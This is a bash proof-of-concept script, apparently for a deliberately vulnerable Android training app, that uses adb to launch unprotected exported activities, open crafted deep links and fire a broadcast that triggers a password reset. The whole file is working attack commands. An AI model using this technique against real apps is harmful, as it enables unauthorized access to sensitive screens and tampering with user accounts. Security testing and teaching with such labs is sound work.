#!/bin/bash

# PoC for Exported Components Vulnerability - VulnerApp DLH
# Multiple exported activities and receivers without permission protection

echo "[*] Exploiting exported components in com.dlh.vulnerapp"

# Test exported activities
echo "[+] Launching exported activities..."

echo "[*] Accessing SecretsActivity..."
adb shell am start -n com.dlh.vulnerapp/.SecretsActivity

echo "[*] Accessing SQLInjectionActivity..."
adb shell am start -n com.dlh.vulnerapp/.SQLInjectionActivity

echo "[*] Accessing InsecureFileActivity..."
adb shell am start -n com.dlh.vulnerapp/.InsecureFileActivity

echo "[*] Accessing CryptoActivity..."
adb shell am start -n com.dlh.vulnerapp/.CryptoActivity

echo "[*] Accessing GraphQLInjectionActivity..."
adb shell am start -n com.dlh.vulnerapp/.GraphQLInjectionActivity

echo "[*] Accessing UnprotectedExportedActivity via deep link..."
adb shell am start -a android.intent.action.VIEW -d "vulnerapp://malicious.com/exploit"

echo "[*] Accessing WebViewActivity via deep link..."
adb shell am start -a android.intent.action.VIEW -d "dlh://webview/malicious"

# Test exported broadcast receiver
echo "[+] Exploiting exported broadcast receiver..."
echo "[*] Triggering password reset via SpoofableReceiver..."
adb shell am broadcast -a com.dlh.vulnerapp.ACTION_RESET_PASSWORD

echo "[*] PoC completed. Check device for unauthorized access to sensitive activities."
``